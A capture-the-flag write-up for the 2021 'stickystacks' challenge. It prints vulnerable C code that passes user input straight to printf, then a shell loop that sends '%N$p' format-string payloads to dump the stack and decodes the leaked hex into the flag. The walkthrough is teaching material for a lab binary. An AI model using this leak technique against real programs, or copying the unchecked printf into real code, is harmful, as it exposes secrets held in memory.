
# stickystacks

## Description

```
I made a program that holds a lot of secrets... maybe even a flag!

Source

Connect with nc shell.actf.co 21820, or visit /problems/2021/stickystacks on the shell server.

Author: JoshDaBosh
```

## Analysis

Check out `stickystacks.c`:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


typedef struct Secrets {
    char secret1[50];
    char password[50];
    char birthday[50];
    char ssn[50];
    char flag[128];
} Secrets;


int vuln(){
    char name[7];

    Secrets boshsecrets = {
        .secret1 = "CTFs are fun!",
        .password= "password123",
        .birthday = "1/1/1970",
        .ssn = "123-456-7890",
    };


    FILE *f = fopen("flag.txt","r");
    if (!f) {
        printf("Missing flag.txt. Contact an admin if you see this on remote.");
        exit(1);
    }
    fgets(&(boshsecrets.flag), 128, f);


    puts("Name: ");

    fgets(name, 6, stdin);


    printf("Welcome, ");
    printf(name);
    printf("\n");

    return 0;
}


int main(){
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    vuln();

    return 0;
}
```

This reads the flag onto the stack but never prints it.

We can't overflow name, but there is a format string vuln here:

```
    printf(name);
```

This can be used to leak what's on the stack. For example:

```
team8838@actf:/problems/2021/stickystacks$ perl -e 'print "%1\$p"' | ./stickystacks Name: 
Welcome, 0x7ffcaee9b7a0
```

## Solution

Dump out enough of the stack to ready `boshsecrets.flag`.

```
team8838@actf:/problems/2021/stickystacks$ for i in `seq 1 50`; do perl -e 'print "%${ARGV[0]}\$p"' $i | ./stickystacks | grep Welcome | awk '{print $2}'; done
0x7ffd0b9b2f40
(nil)
(nil)
0x9
0x9
(nil)
0x1efe2a0
0x6572612073465443
0x216e756620
(nil)
(nil)
(nil)
(nil)
0x6f77737361700000
0x3332316472
(nil)
(nil)
(nil)
(nil)
0x2f312f3100000000
0x30373931
(nil)
(nil)
(nil)
(nil)
0x3231000000000000
0x38372d3635342d33
0x3039
(nil)
(nil)
(nil)
(nil)
0x6c65777b66746361
0x61625f6d27695f6c
0x6c625f6e695f6b63
0x5f7365795f6b6361
0x6b6361625f6d2769
0x5f6568745f6e695f
0x65625f6b63617473
0x3439323135623963
0x3438363737646165
0xa7d333935663161
(nil)
(nil)
(nil)
(nil)
(nil)
(nil)
0x401420
0x7024303525f0
```

This last big string is our flag. The first line has `7b` (`{`) and the last line has `7d` (`}`) and `0a` (`\n`).

```
0x6c65777b66746361
0x61625f6d27695f6c
0x6c625f6e695f6b63
0x5f7365795f6b6361
0x6b6361625f6d2769
0x5f6568745f6e695f
0x65625f6b63617473
0x3439323135623963
0x3438363737646165
0xa7d333935663161
```

I'm sure there's a better way, but I just reversed each line by hand and added a space between each byte.

```
61 63 74 66 7b 77 65 6c
6c 5f 69 27 6d 5f 62 61
63 6b 5f 69 6e 5f 62 6c
61 63 6b 5f 79 65 73 5f
69 27 6d 5f 62 61 63 6b
5f 69 6e 5f 74 68 65 5f
73 74 61 63 6b 5f 62 65
63 39 62 35 31 32 39 34
65 61 64 37 37 36 38 34
61 31 66 35 39 33 7d 0a
```

Then converted that to ASCII and got:

```
actf{well_i'm_back_in_black_yes_i'm_back_in_the_stack_bec9b51294ead77684a1f593}
```

